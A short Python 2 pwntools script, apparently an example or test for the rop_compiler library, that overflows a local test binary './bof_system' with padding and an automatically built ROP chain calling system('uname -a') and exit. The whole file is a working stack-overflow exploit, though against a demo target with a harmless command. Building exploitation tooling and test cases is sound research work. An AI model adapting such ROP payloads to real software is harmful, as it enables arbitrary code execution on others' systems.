import sys, logging
from pwn import *
from rop_compiler import ropme, goal

filename = './bof_system'
p = process([filename,'3000'])
#gdb.attach(p, "set disassembly-flavor intel\nbreak *0x40067f\nbreak *system\nbreak *exit")

print "Using automatically built ROP chain"
files = [(filename, None, None)]
uname_a_address = 0x400810 # address of the string "uname -a"
rop = ropme.rop(files, [], [["function", "system", uname_a_address], ["function", "exit", 33]], log_level = logging.DEBUG)

payload = 'A'*512 + 'B'*8 + rop

with open("/tmp/rop", "w") as f: f.write(rop)
with open("/tmp/payload", "w") as f: f.write(payload)

print 'Calling system("uname -a") in the target'
p.readline()
p.writeline(payload)
print "\n%s\n" % p.readline()
